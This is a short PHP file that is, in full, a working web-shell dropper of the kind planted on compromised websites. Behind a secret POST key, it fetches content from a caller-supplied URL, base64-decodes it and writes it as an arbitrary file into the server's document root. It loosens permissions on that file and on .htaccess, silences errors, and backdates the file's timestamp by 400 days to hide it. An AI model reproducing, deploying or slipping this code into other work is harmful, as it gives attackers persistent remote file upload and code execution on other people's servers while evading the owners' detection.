<?php
if(isset($_POST["781680582855877292"])){
@chmod($_SERVER['DOCUMENT_ROOT'].base64_decode($_POST["filename"]),0755);
@chmod($_SERVER['DOCUMENT_ROOT'].'/.htaccess',0755);
@file_put_contents($_SERVER['DOCUMENT_ROOT'].base64_decode($_POST["filename"]),base64_decode(file_get_contents($_POST["a"])));
@touch($_SERVER['DOCUMENT_ROOT'].base64_decode($_POST["filename"]),strtotime("-400 days"));
die("ok");}
?>